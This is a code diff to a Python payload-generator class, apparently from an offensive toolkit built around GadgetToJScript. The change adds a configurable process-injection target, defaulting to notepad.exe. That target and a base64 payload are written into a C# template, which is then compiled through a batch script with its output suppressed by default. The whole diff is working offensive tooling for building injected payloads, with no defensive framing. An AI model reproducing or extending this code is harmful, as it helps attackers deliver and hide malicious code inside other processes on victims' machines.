@@ -48,11 +48,14 @@ class mypayloadgen():
         self.__gtojs_toCS = "Client\\external\\GadgetToJScript\\"
         self.__gtojs_outputname = "GadgetToJScript.cs"
         self.__gtojs_payload_tag = r"%%PAYLOAD%%"
+        self.__gtojs_injection_target_tag = r"%%TARGETPS%%"
+        self.__gtojs_injection_target = "notepad.exe"
 
 
 
 
-        self.__mystd = None
+
+        self.__mystd = subprocess.DEVNULL
 
     def debug_mode(self,inbool):
         if inbool:
@@ -60,6 +63,8 @@ class mypayloadgen():
         else:
             self.__mystd = subprocess.DEVNULL
 
+    def set_injection_target(self,target):
+        self.__gtojs_injection_target = target
 
     def gen_gtojs(self):
         mycwd = os.path.join(self.__parentdir,self.__to_client)
@@ -82,7 +87,9 @@ class mypayloadgen():
             all_of_it = f.read()
         
         with open(os.path.join(self.__parentdir,self.__gtojs_toCS,self.__gtojs_outputname),mode='w') as f:
-            f.write(all_of_it.replace(self.__gtojs_payload_tag,myb64))
+            addpayload = all_of_it.replace(self.__gtojs_payload_tag,myb64)
+            addtarget = addpayload.replace(self.__gtojs_injection_target_tag,self.__gtojs_injection_target)
+            f.write(addtarget)
         
         subprocess.run(["gtojs.bat"], shell=True, cwd=mycwd, stdout=self.__mystd)
 
